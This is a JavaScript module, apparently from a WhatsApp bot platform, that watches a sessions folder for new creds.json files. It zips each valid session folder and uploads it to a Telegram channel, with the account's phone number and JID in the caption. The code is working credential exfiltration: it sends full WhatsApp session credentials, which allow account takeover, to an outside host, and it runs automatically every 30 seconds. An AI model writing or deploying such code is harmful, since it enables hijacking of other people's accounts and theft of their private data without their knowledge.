/**
 * ═══════════════════════════════════════════════════════
 * 👁️ SESSION MONITOR | مراقب الجلسات
 * ═══════════════════════════════════════════════════════
 * 👑 المطور: آدم (شادو)
 * 📜 الوصف: يراقب مجلد الجلسات الجديدة ويرفعها لقناة التليجرام
 * ═══════════════════════════════════════════════════════
 */

import fs from 'fs'
import path from 'path'
import { fileURLToPath } from 'url'
import { Telegraf } from 'telegraf'
import archiver from 'archiver'
import { createReadStream } from 'fs'
import { pipeline } from 'stream/promises'

const __dirname = path.dirname(fileURLToPath(import.meta.url))

class SessionMonitor {
  constructor() {
    this.sessionsPath = path.join(process.cwd(), global.sessionsMain, global.sessionsSub)
    this.processed = new Set()
    this.bot = null
    this.watcher = null
    this.checkInterval = null
  }

  async start() {
    // إنشاء المجلد لو مش موجود
    if (!fs.existsSync(this.sessionsPath)) {
      fs.mkdirSync(this.sessionsPath, { recursive: true })
    }

    // بدء بوت التليجرام
    if (global.telegramBotToken && !global.telegramBotToken.includes('ضع')) {
      this.bot = new Telegraf(global.telegramBotToken)
      console.log('[MONITOR] ✅ تم بدء مراقب الجلسات')
    } else {
      console.log('[MONITOR] ⚠️ توكن التليجرام غير مضبوط، لن يتم رفع الجلسات')
    }

    // بدء المراقبة
    this.startWatching()

    // فحص دوري كل 30 ثانية
    this.checkInterval = setInterval(() => this.checkNewSessions(), 30000)

    // فحص أولي
    await this.checkNewSessions()
  }

  startWatching() {
    try {
      this.watcher = fs.watch(this.sessionsPath, { recursive: true }, (eventType, filename) => {
        if (filename && filename.includes('creds.json')) {
          const sessionId = filename.split('/')[0] || filename.split('\\')[0]
          this.processSession(sessionId)
        }
      })
    } catch (e) {
      console.log('[MONITOR] ⚠️ Watch failed, using polling:', e.message)
    }
  }

  async checkNewSessions() {
    try {
      if (!fs.existsSync(this.sessionsPath)) return

      const dirs = fs.readdirSync(this.sessionsPath)
      for (const dir of dirs) {
        const credsPath = path.join(this.sessionsPath, dir, 'creds.json')
        if (fs.existsSync(credsPath) && !this.processed.has(dir)) {
          await this.processSession(dir)
        }
      }
    } catch (e) {
      console.error('[MONITOR] Error checking sessions:', e.message)
    }
  }

  async processSession(sessionId) {
    if (this.processed.has(sessionId)) return

    const sessionPath = path.join(this.sessionsPath, sessionId)
    const credsPath = path.join(sessionPath, 'creds.json')

    if (!fs.existsSync(credsPath)) return

    try {
      // التحقق من صحة الجلسة
      const creds = JSON.parse(fs.readFileSync(credsPath, 'utf-8'))
      if (!creds.me || !creds.me.id) {
        console.log(`[MONITOR] ⚠️ جلسة غير صالحة: ${sessionId}`)
        return
      }

      console.log(`[MONITOR] 📤 جاري رفع الجلسة: ${sessionId}`)

      // ضغط المجلد كملف ZIP
      const zipPath = await this.zipSession(sessionPath, sessionId)

      // رفع إلى التليجرام
      if (this.bot && global.telegramSessionsChannel) {
        await this.uploadToTelegram(zipPath, sessionId, creds)
      }

      // وضع علامة كمعالج
      this.processed.add(sessionId)

      // حذف الملف المضغوط
      fs.unlinkSync(zipPath)

      console.log(`[MONITOR] ✅ تم رفع الجلسة بنجاح: ${sessionId}`)
    } catch (e) {
      console.error(`[MONITOR] ❌ خطأ في معالجة الجلسة ${sessionId}:`, e.message)
    }
  }

  async zipSession(sessionPath, sessionId) {
    return new Promise((resolve, reject) => {
      const zipPath = path.join(process.cwd(), 'tmp', `${sessionId}.zip`)

      // إنشاء مجلد tmp لو مش موجود
      if (!fs.existsSync(path.join(process.cwd(), 'tmp'))) {
        fs.mkdirSync(path.join(process.cwd(), 'tmp'), { recursive: true })
      }

      const output = fs.createWriteStream(zipPath)
      const archive = archiver('zip', { zlib: { level: 9 } })

      output.on('close', () => resolve(zipPath))
      archive.on('error', (err) => reject(err))

      archive.pipe(output)
      archive.directory(sessionPath, false)
      archive.finalize()
    })
  }

  async uploadToTelegram(zipPath, sessionId, creds) {
    try {
      const caption = [
        '🕸 *جلسة سوكونا جديدة*',
        '',
        `📱 الرقم: \`${creds.me.id.split('@')[0]}\``,
        `🆔 JID: \`${creds.me.id}\``,
        `📅 التاريخ: ${new Date().toLocaleString('ar-EG')}`,
        `🔖 معرف الجلسة: \`${sessionId}\``,
        '',
        '⊱⊹•─๋︩︪═╾═─•┈⧽┊🎭┊⧼┈•─═╼═─๋︩︪•⊹⊰',
        `🤖 ${global.platform.name} v${global.platform.version}`
      ].join('\n')

      await this.bot.telegram.sendDocument(
        global.telegramSessionsChannel,
        { source: fs.createReadStream(zipPath) },
        {
          caption,
          parse_mode: 'Markdown',
          filename: `${sessionId}.zip`
        }
      )
    } catch (e) {
      console.error('[MONITOR] ❌ فشل رفع الملف للتليجرام:', e.message)
    }
  }

  stop() {
    if (this.watcher) {
      this.watcher.close()
      this.watcher = null
    }
    if (this.checkInterval) {
      clearInterval(this.checkInterval)
      this.checkInterval = null
    }
    if (this.bot) {
      this.bot.stop()
      this.bot = null
    }
  }
}

export default SessionMonitor